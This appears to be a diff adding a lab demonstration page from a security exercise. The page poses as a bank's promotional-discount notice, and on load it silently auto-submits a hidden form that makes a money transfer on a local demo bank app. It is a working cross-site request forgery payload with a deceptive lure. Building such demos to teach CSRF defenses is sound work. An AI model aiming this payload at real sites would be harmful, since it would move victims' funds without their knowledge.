@@ -1,0 +1,37 @@
+<!-- malicious page where the CSRF Attack executes once the browser visits the page -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+	<title>Capstone Bank - Promotional Offer</title>
+  <link rel="stylesheet" href="style.css">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+</head>
+<body>
+  <div class="container">
+    <h1>Capstone Bank</h1>
+    <h2>Today is your lucky day!</h2>
+    <p>You have earned an 80% discount on Udemy courses purchased during 2025.</p>
+    <p>No further action is required on your part. We appreciate your business.
+			<br>You can close this page now.</p>
+  </div>
+
+  <!-- CSRF attack below. Code adapted from: https://portswigger.net/web-security/csrf -->
+
+	<!-- iframe to get & hide HTML response from the bank-->
+  <iframe name="hiddenFrame" style="display:none;"></iframe>
+
+  <!-- send bank's response to iframe via 'target':
+  	https://developer.mozilla.org/en-US/docs/Web/API/HTMLAnchorElement/target -->
+  <form action="http://localhost:5000/transfer" method="POST" target="hiddenFrame">
+    <input type="hidden" name="from_account" value="savings">
+    <input type="hidden" name="to_account" value="checking">
+    <input type="hidden" name="amount" value="99.99"/>
+  </form>
+
+	<!-- submit the form upon loading the page -->
+  <script>
+    document.forms[0].submit();
+  </script>
+</body>
+</html>
